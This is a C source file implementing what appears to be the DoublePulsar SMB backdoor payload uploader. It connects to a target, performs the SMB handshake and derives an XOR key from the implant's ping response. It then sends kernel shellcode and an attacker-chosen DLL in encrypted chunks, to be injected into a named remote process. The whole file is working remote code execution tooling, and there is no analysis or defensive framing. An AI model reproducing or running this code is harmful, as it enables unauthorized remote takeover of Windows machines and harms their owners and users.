#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdint.h>
#include <stddef.h>
#include <limits.h>
#include <stdlib.h>
#include <string.h>
#include "config.h"

extern void xor_buffer(uint8_t *buffer, size_t length, uint32_t key);

static int upload_send_all(SOCKET sock, const uint8_t *buffer, size_t length)
{
    size_t sent = 0;

    while (sent < length) {
        int amount = length - sent > INT_MAX ? INT_MAX : (int)(length - sent);
        int result = send(sock, (const char *)buffer + sent, amount, 0);
        if (result == SOCKET_ERROR || result == 0)
            return -1;
        sent += (size_t)result;
    }
    return 0;
}

static int upload_recv_all(SOCKET sock, uint8_t *buffer, size_t length)
{
    size_t received = 0;

    while (received < length) {
        int amount = length - received > INT_MAX ? INT_MAX : (int)(length - received);
        int result = recv(sock, (char *)buffer + received, amount, 0);
        if (result == SOCKET_ERROR || result == 0)
            return -1;
        received += (size_t)result;
    }
    return 0;
}

static int upload_recv_packet(SOCKET sock, uint8_t **packet, size_t *packet_length)
{
    uint8_t header[4];
    uint32_t body_length;
    uint8_t *result;

    if (upload_recv_all(sock, header, sizeof(header)) != 0)
        return -1;

    body_length = ((uint32_t)header[1] << 16) |
                  ((uint32_t)header[2] << 8) |
                  (uint32_t)header[3];
    if ((size_t)body_length > SIZE_MAX - sizeof(header))
        return -1;

    result = (uint8_t *)malloc((size_t)body_length + sizeof(header));
    if (result == NULL)
        return -1;

    memcpy(result, header, sizeof(header));
    if (body_length != 0 &&
        upload_recv_all(sock, result + sizeof(header), (size_t)body_length) != 0) {
        free(result);
        return -1;
    }

    *packet = result;
    *packet_length = (size_t)body_length + sizeof(header);
    return 0;
}

static int upload_exchange(SOCKET sock, const uint8_t *request, size_t request_length,
                           uint8_t **response, size_t *response_length)
{
    if (upload_send_all(sock, request, request_length) != 0)
        return -1;
    return upload_recv_packet(sock, response, response_length);
}

static void upload_put_le16(uint8_t *buffer, size_t offset, uint16_t value)
{
    buffer[offset] = (uint8_t)value;
    buffer[offset + 1] = (uint8_t)(value >> 8);
}

static void upload_put_le32(uint8_t *buffer, size_t offset, uint32_t value)
{
    buffer[offset] = (uint8_t)value;
    buffer[offset + 1] = (uint8_t)(value >> 8);
    buffer[offset + 2] = (uint8_t)(value >> 16);
    buffer[offset + 3] = (uint8_t)(value >> 24);
}

int upload_payload(const char *ip, int port, const char *payload_path, int payload_type)
{
    WSADATA wsa_data;
    SOCKET sock = INVALID_SOCKET;
    struct sockaddr_in address;
    HANDLE file = INVALID_HANDLE_VALUE;
    LARGE_INTEGER file_size;
    uint8_t *dll = NULL;
    uint8_t *payload = NULL;
    uint8_t *response = NULL;
    size_t response_length = 0;
    size_t dll_size = 0;
    size_t payload_size = 0;
    size_t offset;
    uint16_t user_id;
    uint16_t tree_id;
    uint32_t signature;
    uint32_t key;
    uint32_t inject_hash = 0;
    const unsigned char *name;
    int wsa_started = 0;
    int result = -1;

    (void)payload_type;

    if (ip == NULL || payload_path == NULL || port < 1 || port > 65535)
        return -1;

    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0)
        goto cleanup;
    wsa_started = 1;

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET)
        goto cleanup;

    memset(&address, 0, sizeof(address));
    address.sin_family = AF_INET;
    address.sin_port = htons((u_short)port);
    if (InetPtonA(AF_INET, ip, &address.sin_addr) != 1)
        goto cleanup;
    if (connect(sock, (const struct sockaddr *)&address, sizeof(address)) == SOCKET_ERROR)
        goto cleanup;

    file = CreateFileA(payload_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING,
                       FILE_ATTRIBUTE_NORMAL, NULL);
    if (file == INVALID_HANDLE_VALUE)
        goto cleanup;
    if (!GetFileSizeEx(file, &file_size) || file_size.QuadPart < 0 ||
        (uint64_t)file_size.QuadPart > SIZE_MAX ||
        (uint64_t)file_size.QuadPart > UINT32_MAX)
        goto cleanup;

    dll_size = (size_t)file_size.QuadPart;
    if (dll_size != 0) {
        size_t read_offset = 0;
        dll = (uint8_t *)malloc(dll_size);
        if (dll == NULL)
            goto cleanup;
        while (read_offset < dll_size) {
            DWORD amount = dll_size - read_offset > MAXDWORD
                               ? MAXDWORD
                               : (DWORD)(dll_size - read_offset);
            DWORD bytes_read = 0;
            if (!ReadFile(file, dll + read_offset, amount, &bytes_read, NULL) ||
                bytes_read == 0)
                goto cleanup;
            read_offset += bytes_read;
        }
    }
    CloseHandle(file);
    file = INVALID_HANDLE_VALUE;

    if (dll_size > UINT32_MAX - (size_t)KERNEL_RUNDLL_SIZE ||
        dll_size > UINT32_MAX - 3978u)
        goto cleanup;
    payload_size = (size_t)KERNEL_RUNDLL_SIZE + dll_size;
    if (payload_size > UINT32_MAX)
        goto cleanup;

    payload = (uint8_t *)malloc(payload_size);
    if (payload == NULL)
        goto cleanup;
    memcpy(payload, KERNEL_RUNDLL_SHELLCODE, (size_t)KERNEL_RUNDLL_SIZE);
    if (dll_size != 0)
        memcpy(payload + KERNEL_RUNDLL_SIZE, dll, dll_size);

    upload_put_le32(payload, KERNEL_RUNDLL_TOTAL_OFFSET, (uint32_t)(dll_size + 3978u));
    upload_put_le32(payload, KERNEL_RUNDLL_DLLSIZE_OFFSET, (uint32_t)dll_size);
    upload_put_le32(payload, KERNEL_RUNDLL_ORDINAL_OFFSET, 1u);

    name = (const unsigned char *)TARGET_INJECT_PROCESS;
    while (*name != 0) {
        inject_hash = inject_hash * 127u + (uint32_t)*name;
        ++name;
    }
    upload_put_le32(payload, KERNEL_RUNDLL_HASH_OFFSET, inject_hash);

    if (upload_exchange(sock, SMB_NEGOTIATE_PKT, sizeof(SMB_NEGOTIATE_PKT) - 1,
                        &response, &response_length) != 0)
        goto cleanup;
    free(response);
    response = NULL;

    if (upload_exchange(sock, SMB_SESSION_SETUP_PKT, sizeof(SMB_SESSION_SETUP_PKT) - 1,
                        &response, &response_length) != 0)
        goto cleanup;
    if (response_length < 34)
        goto cleanup;
    user_id = (uint16_t)response[32] | ((uint16_t)response[33] << 8);
    free(response);
    response = NULL;

    {
        uint8_t tree_packet[sizeof(SMB_TREE_CONNECT_PKT) - 1];
        memcpy(tree_packet, SMB_TREE_CONNECT_PKT, sizeof(tree_packet));
        upload_put_le16(tree_packet, 32, user_id);
        if (upload_exchange(sock, tree_packet, sizeof(tree_packet),
                            &response, &response_length) != 0)
            goto cleanup;
    }
    if (response_length < 30)
        goto cleanup;
    tree_id = (uint16_t)response[28] | ((uint16_t)response[29] << 8);
    free(response);
    response = NULL;

    {
        uint8_t ping_packet[sizeof(DP_PING_PKT) - 1];
        memcpy(ping_packet, DP_PING_PKT, sizeof(ping_packet));
        upload_put_le16(ping_packet, 28, tree_id);
        upload_put_le16(ping_packet, 32, user_id);
        if (upload_exchange(sock, ping_packet, sizeof(ping_packet),
                            &response, &response_length) != 0)
            goto cleanup;
    }
    if (response_length < (size_t)SMB_RESP_SIGNATURE_START + 4)
        goto cleanup;
    signature = (uint32_t)response[SMB_RESP_SIGNATURE_START] |
                ((uint32_t)response[SMB_RESP_SIGNATURE_START + 1] << 8) |
                ((uint32_t)response[SMB_RESP_SIGNATURE_START + 2] << 16) |
                ((uint32_t)response[SMB_RESP_SIGNATURE_START + 3] << 24);
    key = 2u * signature ^
          ((((signature >> 16) | (signature & 0x00FF0000u)) >> 8) |
           (((signature << 16) | (signature & 0x0000FF00u)) << 8));
    free(response);
    response = NULL;

    xor_buffer(payload, payload_size, key);

    for (offset = 0; offset < payload_size; ) {
        size_t chunk = payload_size - offset;
        size_t packet_length;
        uint8_t *packet;
        uint32_t parameter;
        uint32_t netbios_length;

        if (chunk > SMB_EXEC_SHELLCODE_LEN)
            chunk = SMB_EXEC_SHELLCODE_LEN;
        if (chunk > UINT16_MAX || chunk > SIZE_MAX - SMB_EXEC_TEMPLATE_LEN - 12)
            goto cleanup;

        packet_length = (size_t)SMB_EXEC_TEMPLATE_LEN + 12 + chunk;
        packet = (uint8_t *)malloc(packet_length);
        if (packet == NULL)
            goto cleanup;

        memcpy(packet, DP_EXEC_PKT, (size_t)SMB_EXEC_TEMPLATE_LEN);
        parameter = (uint32_t)payload_size ^ key;
        upload_put_le32(packet, SMB_EXEC_TEMPLATE_LEN, parameter);
        parameter = (uint32_t)chunk ^ key;
        upload_put_le32(packet, SMB_EXEC_TEMPLATE_LEN + 4, parameter);
        parameter = (uint32_t)offset ^ key;
        upload_put_le32(packet, SMB_EXEC_TEMPLATE_LEN + 8, parameter);
        memcpy(packet + SMB_EXEC_TEMPLATE_LEN + 12, payload + offset, chunk);

        netbios_length = (uint32_t)(chunk + SMB_EXEC_TEMPLATE_LEN + 12 - 4);
        packet[SMB_NETBIOS_LEN_OFFSET] = (uint8_t)(netbios_length >> 16);
        packet[SMB_NETBIOS_LEN_OFFSET + 1] = (uint8_t)(netbios_length >> 8);
        packet[SMB_NETBIOS_LEN_OFFSET + 2] = (uint8_t)netbios_length;
        upload_put_le16(packet, SMB_EXEC_TOTAL_DATA_OFFSET, (uint16_t)chunk);
        upload_put_le16(packet, SMB_EXEC_DATA_COUNT_OFFSET, (uint16_t)chunk);
        upload_put_le16(packet, SMB_EXEC_BYTE_COUNT_OFFSET, (uint16_t)(chunk + 12));
        upload_put_le16(packet, SMB_TID_OFFSET, tree_id);
        upload_put_le16(packet, SMB_UID_OFFSET, user_id);

        if (upload_exchange(sock, packet, packet_length,
                            &response, &response_length) != 0) {
            free(packet);
            goto cleanup;
        }
        free(packet);

        if (response_length <= (size_t)DP_RESP_MUX_ID_OFFSET) {
            free(response);
            response = NULL;
            goto cleanup;
        }
        if (offset + chunk == payload_size) {
            int success = response[DP_RESP_MUX_ID_OFFSET] == DP_MULTIPLEX_ID_EXEC;
            free(response);
            response = NULL;
            if (!success)
                goto cleanup;
        } else {
            free(response);
            response = NULL;
        }

        offset += chunk;
    }

    result = 0;

cleanup:
    if (response != NULL)
        free(response);
    if (file != INVALID_HANDLE_VALUE)
        CloseHandle(file);
    if (sock != INVALID_SOCKET)
        closesocket(sock);
    if (wsa_started)
        WSACleanup();
    free(payload);
    free(dll);
    return result;
}